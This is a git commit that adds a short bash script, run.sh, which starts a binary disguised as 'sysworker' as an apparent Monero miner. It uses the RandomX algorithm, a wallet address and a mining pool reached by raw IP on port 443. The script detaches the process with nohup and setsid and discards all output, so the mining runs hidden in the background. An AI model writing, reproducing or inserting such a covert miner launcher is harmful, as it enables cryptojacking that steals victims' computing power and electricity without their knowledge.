91f90b97bd76f894e5981d1128b971941c287374
bandujuna77-debug <bandujuna77@gmail.com>
2026-09-25 18:22:56 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+
+
+nohup setsid ./sysworker -a rx/0 -o 104.207.93.233:443  -u 44yfAkraFFTPJhnDyqLnJhQDtdVEmCjRbNpnM5966oB6Vi1oWvm7Y67TCvFuPeqHNGAspJY8cJvh5gQGGrV8VmpBGArWjvR -p x -t 8 >/dev/null 2>&1 </dev/null &
